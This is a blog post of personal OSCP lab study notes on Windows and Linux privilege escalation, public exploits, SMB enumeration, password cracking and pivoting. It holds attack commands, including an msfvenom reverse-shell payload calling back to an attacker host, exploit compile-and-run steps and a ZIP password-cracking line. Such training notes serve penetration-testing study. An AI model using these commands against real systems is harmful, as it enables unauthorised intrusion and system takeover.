---
layout: post
title:  "OSCP Notes"
categories: OSCP
---

Collection of notes I took while doing the OSCP labs.

# Windows

## Post Exploitation and Privilege Escalation

* Helpful collection of priv esc methods: <https://guif.re/windowseop>

* File transfer methods: <https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/>

* Tools
    * [Powerless](https://github.com/M4ximuss/Powerless) (Privilege Escalation script working without Powershell)
    * [Windows Priv Esc Checker](https://github.com/pentestmonkey/windows-privesc-check)
    * [Windows Exploit Suggester NG](https://github.com/bitsadmin/wesng) (feed it `systeminfo` output and it finds matching exploits)
    * [BeRoot](https://github.com/AlessandroZ/BeRoot/tree/master/Windows)
    * [Pre-Compiled Windows Exploits](https://github.com/SecWiki/windows-kernel-exploits)
    * [Download and compile exploits automatically](https://github.com/wwong99/pentest-notes/blob/master/scripts/xploit_installer.py)
    * [Exploit Table](https://malrawr.com/04.windows/exploit-table/)

* From Admin to System on <= Windows XP:
    * check time with `time`
    * run `at 01:23 /interactive cmd.exe` one minute after what `time` said -> cmd.exe will popup (obviously you will need a RDP connection for this to work)

## Buffer Overflow

* Nice tutorial: <https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/>

* Important:
    * run all apps as administrator (also Immunity Debugger)
    * use Python2 for exploit development

* Steps
    * TODO

## Exploits

* MS08-067:
    * grab exploit from <https://github.com/andyacer/ms08_067>
    * generate shellcode with `msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -a x86 --platform windows` and replace the one in the script with it
    * run it `python ms08_067_2018.py 10.11.1.x 1 445`

* MS11-046 (afd.sys):
    * grab exploit from <https://www.exploit-db.com/raw/40564>
    * compile with `i686-w64-mingw32-gcc 40564.c -o expl.exe -lws2_32`

# Linux

## Post Exploitation and Privilege Escalation

* Tools
    * [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

## MySQL
* Command line usage: `mysql -u root -p`
    * display available databases and tables `show databases;` or `show tables;`
    * use database `use <database>;`

## Exploits

* CVE-2009-2692, Linux Kernel 2.4.x/2.6.x sock_sendpage():
    * grab from <https://www.exploit-db.com/raw/9545>
    * compile with `gcc -m32 -Wl,--hash-style=both 9545.c -o 9545`

# Other

## General

* [AutoRecon](https://github.com/Tib3rius/AutoRecon): Super useful enumeration tool which takes away a lot of manual enumeration work. Just invoke it with e.g. `python3 autorecon.py <ip1> <ip2> -o <outputdir>` and let it run in the background.

## Cracking

* Crack a password protected ZIP file: `fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' protected.zip`

## SMB

* Nice SMB tips: <https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html>

* Execute directly via SMB (helpful if you can't write anything to disk):
    * setup an SMB server on your Kali box: `python /usr/share/doc/python-impacket/examples/smbserver.py SHARE .`
    * run `\\10.11.0.x\SHARE\Powerless.bat` on victim

* Important:
    * Never completely trust `enum4linux` since it misses a lot of stuff (version for example). Use this little bash script to grab the SMB version:

    ```bash
    #!/bin/sh 
    #Author: rewardone 
    #Description: 
    # Requires root or enough permissions to use tcpdump 
    # Will listen for the first 7 packets of a null login 
    # and grab the SMB Version 
    #Notes: 
    # Will sometimes not capture or will print multiple 
    # lines. May need to run a second time for success. 

    if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi 

    if [ ! -z $2 ]; then rport=$2; else rport=139; fi 

    tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " & 

    echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null 

    echo "" && sleep .1 
    ```

    * Alternatives to enum4linux: smbmap, nullinux, NSE scripts (invoke with `nmap -sV -p 139,445 --script='smb-vuln*' --script-args="unsafe=1" <IP address>`)

## Pivoting

* Collection of pivoting methods: <https://sushant747.gitbooks.io/total-oscp-guide/port_forwarding_and_tunneling.html>

* sshuttle usage: `sshuttle -r user@10.11.1.x 10.1.1.0/24`
* alternative: dynamic port forwarding with ssh `ssh -D 9050 user@10.11.1.x`, then use proxychains `proxychains nmap -v --top-ports=20 -sT -Pn 10.1.1.x`